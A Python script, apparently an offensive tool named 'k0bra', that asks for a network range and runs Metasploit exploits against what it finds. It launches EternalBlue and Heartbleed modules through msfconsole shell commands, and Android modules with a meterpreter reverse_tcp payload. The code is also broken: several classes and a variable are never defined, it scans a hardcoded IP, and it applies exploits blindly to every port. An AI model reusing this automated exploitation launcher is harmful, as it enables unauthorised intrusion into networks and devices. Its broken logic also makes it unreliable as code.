#!/usr/bin/env python3
import sqlite3
import logging
import scapy.all as scapy
import nmap
import plotly.graph_objects as go
import requests
import subprocess
import asyncio
import json
import csv
from typing import List, Dict

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Logging configuration
logging.basicConfig(filename='k0bra.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Metasploit module mapping
METASPLOIT_MODULES = {
    "SMB": {
        "CVE-2017-0143": "exploit/windows/smb/ms17_010_eternalblue",
        "CVE-2021-34527": "exploit/windows/smb/printnightmare",
    },
    "HTTP": {
        "CVE-2017-5638": "exploit/multi/http/struts2_content_type_ognl",
        "CVE-2021-26084": "exploit/multi/http/confluence_widget_connector_rce",
    },
    "SSL": {
        "CVE-2014-0160": "auxiliary/scanner/ssl/openssl_heartbleed",
    },
    "Android": {
        "CVE-2017-13156": "exploit/android/local/janus",
        "CVE-2021-0938": "exploit/android/local/put_user_vroot",
    },
}

def print_banner():
    """
    Prints the banner for the tool.
    """
    print(CYAN + "    ██   ██  ██████  ██████  ██████  ██████  ███████  ███████  ███████  ")
    print("    ██  ██  ██  ████ ██   ██ ██   ██ ██   ██ ██   ██ ")
    print("    █████   ██ ██ ██ ██████  ██████  ███████  ████████  ████████  ")
    print("    ██  ██  ████ ██   ██ ██   ██ ██   ██ ██   ██ ██   ██ ")
    print("    ██   ██  ██████  ██████  ███████  ████████  ████████  ████████  ")
    print(GREEN + "Welcome to k0bra - The Network Scavenger! Developed by b0urn3.")
    print("Other tools found at https://github.com/q4n0")
    print("Email: b0urn3@proton.me Instagram: onlybyhive\n" + RESET)

def get_user_input():
    """
    Input function for the target network or IP range.
    """
    print("Please provide the target network or IP range (e.g., 192.168.1.0/24):")
    target_network = input().strip()
    return target_network

def get_cve_input():
    """
    Input function for the path to a local CVE JSON file.
    """
    print("Please provide the path to the CVE JSON file (e.g., /path/to/cve_database.json):")
    cve_file_path = input().strip()
    return cve_file_path

class NetworkSecurityTool:
    def __init__(self, target_network):
        """
        Initialize the security mapping tool
        
        Args:
            target_network (str): Network CIDR or IP range to scan
        """
        self.target = target_network
        self.vulnerabilities = []
        self.network_map = {}
        self.db_connection = self._initialize_database()
        self.logger = self._setup_logging()

    def _initialize_database(self):
        """Create local SQLite database for vulnerability tracking"""
        conn = sqlite3.connect('security_map.db')
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities
                          (ip TEXT, mac TEXT, port INTEGER, vulnerability TEXT, risk_score INTEGER)''')
        conn.commit()
        return conn

    def _setup_logging(self):
        """Configure logging with rotation"""
        logger = logging.getLogger('NetworkSecurityTool')
        handler = logging.FileHandler('tool.log')
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        return logger

    def save_report(self, network_info, open_ports, vulnerabilities):
        """Generate a CSV report for the scan results."""
        with open('scan_report.csv', mode='w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(['IP Address', 'Open Ports', 'Vulnerabilities', 'Risk Score'])
            for ip, ports in open_ports.items():
                vulnerability_list = []
                risk_score = 'None'
                for vulnerability in vulnerabilities.get(ip, []):
                    vulnerability_list.append(vulnerability[0])
                    risk_score = vulnerability[1]  # Assuming first vulnerability is most critical
                writer.writerow([ip, ', '.join(map(str, ports)), ', '.join(vulnerability_list), risk_score])
        print(GREEN + "Scan report saved as scan_report.csv" + RESET)

def metasploit_exploit(target_ip, target_port, service, cve_id):
    """
    Automatically run Metasploit module based on service and CVE.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Open port
        service (str): Detected service (e.g., SMB, HTTP)
        cve_id (str): CVE ID linked to the vulnerability
    """
    if service in METASPLOIT_MODULES and cve_id in METASPLOIT_MODULES[service]:
        module = METASPLOIT_MODULES[service][cve_id]
        try:
            command = f"msfconsole -x 'use {module}; set RHOSTS {target_ip}; set RPORT {target_port}; exploit'"
            print(YELLOW + f"Running Metasploit module for {service} ({cve_id}): {module}" + RESET)
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(RED + f"Metasploit exploit failed: {str(e)}" + RESET)
    else:
        print(RED + f"No Metasploit module found for {service} and CVE {cve_id}" + RESET)

def metasploit_exploit_android(target_ip, target_port, module, payload="android/meterpreter/reverse_tcp"):
    """
    Run an Android-specific Metasploit module.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Open port
        module (str): Metasploit module to run
        payload (str): Payload to use (default: Meterpreter Reverse TCP)
    """
    try:
        command = (
            f"msfconsole -x 'use {module}; set RHOSTS {target_ip}; set RPORT {target_port}; "
            f"set PAYLOAD {payload}; exploit'"
        )
        print(YELLOW + f"Running Android Metasploit module: {module} with payload: {payload}" + RESET)
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(RED + f"Metasploit exploit failed: {str(e)}" + RESET)

# Async main function
async def main():
    target_network = get_user_input()  # Get target network from user input
    cve_file_path = get_cve_input()  # Get CVE JSON file path from user input
    tool = NetworkSecurityTool(target_network)

    discovery = NetworkDiscovery()
    scanner = VulnerabilityScanner(cve_file_path)  # Pass the local CVE file path
    visualizer = NetworkVisualizer()

    # Perform scan and get results
    network_info = discovery.network_scan(target_network)
    open_ports = discovery.port_enumeration('192.168.1.10')

    # Automated exploitation using Metasploit
    for ip, ports in open_ports.items():
        for port in ports.get("TCP", []):
            metasploit_exploit(ip, port, 'SMB', 'CVE-2017-0143')  # Example for SMB
        for port in ports.get("UDP", []):
            metasploit_exploit(ip, port, 'SSL', 'CVE-2014-0160')  # Example for SSL
        for port in ports.get("TCP", []):
            if port == 5555:  # Example for Android Debug Bridge
                metasploit_exploit_android(ip, port, "exploit/android/local/janus")

    # Save results and show visualization
    tool.save_report(network_info, open_ports, vulnerabilities)
    topology = visualizer.create_topology_graph(network_info)
    topology.show()

# Start asynchronous main function
if __name__ == "__main__":
    asyncio.run(main())
